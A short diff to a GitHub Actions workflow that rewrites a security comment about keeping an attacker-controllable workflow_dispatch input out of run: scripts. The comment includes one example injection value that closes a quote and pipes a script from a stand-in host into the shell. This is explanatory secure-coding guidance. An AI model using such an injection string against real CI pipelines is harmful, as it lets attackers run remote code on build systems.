@@ -44,7 +44,8 @@ jobs:
         with:
           node-version: 24
       # SECURITY: `inputs.version` is attacker-controllable (anyone who can trigger workflow_dispatch
-      # chooses it) and this job holds `contents: write`. It must never be spliced into a `run:`
+      # chooses it). This read-only job validates the value before publication jobs use it.
+      # It must never be spliced into a `run:`
       # script via `${{ }}` -- GitHub expands that *before* the shell sees it, so a value like
       # `" ; curl evil.sh | sh #` would close the quote and execute. Passing it through `env:` makes
       # it reach the shell as inert data (a variable value), never as script text. It is also
